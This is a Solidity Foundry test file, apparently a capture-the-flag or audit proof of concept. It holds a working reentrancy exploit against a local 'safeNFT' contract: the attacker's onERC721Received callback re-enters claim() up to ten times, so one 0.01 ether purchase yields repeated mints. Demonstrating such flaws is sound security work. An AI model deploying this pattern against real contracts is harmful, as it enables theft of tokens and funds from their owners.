// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "@forge-std/Test.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
interface ISafeNFT{
    function buyNFT() external payable;
    function claim() external;
} 

contract AttackerContract is IERC721Receiver{
    address owner;
    ISafeNFT safeNft;
    uint256 count = 10;
    
    constructor(address _attacker,address _contract){
        owner = _attacker;
        safeNft = ISafeNFT(_contract);
    }

    function setupAttack() public payable {
        require(owner == msg.sender, "not authorized");
        require(msg.value == 0.01 ether);
        safeNft.buyNFT{value : msg.value}();
        safeNft.claim();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        
        if(count > 0){
            count -= 1;
            safeNft.claim();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract safeNFtTest is Test {
    ISafeNFT safeNft;
    address attacker = makeAddr("attacker");

    function setUp() public {
        address contractAddr = deployCode("src/safeNFT.sol:safeNFT",abi.encode(
        "Safe NFT",
        "SNFT",
        0.01 ether
    ));
        safeNft = ISafeNFT(contractAddr);
    }

    function test_attack() public {
        vm.deal(attacker , 0.01 ether);
        vm.startPrank(attacker);
        AttackerContract attackerContract = new AttackerContract(attacker , address(safeNft));
        attackerContract.setupAttack{value : 0.01 ether}();
        vm.stopPrank();
    }
}